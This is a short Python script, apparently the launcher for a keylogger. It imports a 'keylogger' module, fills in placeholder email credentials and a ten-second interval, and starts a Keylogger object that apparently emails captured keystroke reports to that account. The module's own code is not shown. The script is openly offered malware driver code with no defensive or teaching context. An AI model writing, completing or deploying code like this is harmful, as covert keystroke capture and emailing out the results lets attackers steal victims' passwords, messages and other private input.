import keylogger


email = " # please enter the email in which you want to share the report"
password = " # password of ur email account"
time_interval = 10

my_keylogger = keylogger.Keylogger(email,password,time_interval)
my_keylogger.start()
